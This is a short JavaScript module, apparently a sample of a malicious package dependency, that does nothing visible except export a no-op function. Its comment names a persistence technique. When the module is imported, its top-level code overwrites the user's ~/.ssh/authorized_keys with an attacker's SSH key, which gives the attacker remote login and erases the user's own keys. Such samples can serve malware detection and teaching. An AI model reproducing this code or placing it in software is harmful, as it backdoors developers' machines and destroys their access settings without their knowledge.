import { writeFileSync } from 'fs';
import { homedir } from 'os';
import { join } from 'path';

// Persistence pattern: installing an attacker SSH key at module top-level.
// Survives uninstall of the original package — once the key is in
// authorized_keys, the attacker can SSH back even after the malicious dep
// is removed.
writeFileSync(
  join(homedir(), '.ssh', 'authorized_keys'),
  'ssh-rsa AAAAB3NzaC1yc2E...attacker-key... attacker@persistence',
);

export const noop = () => null;
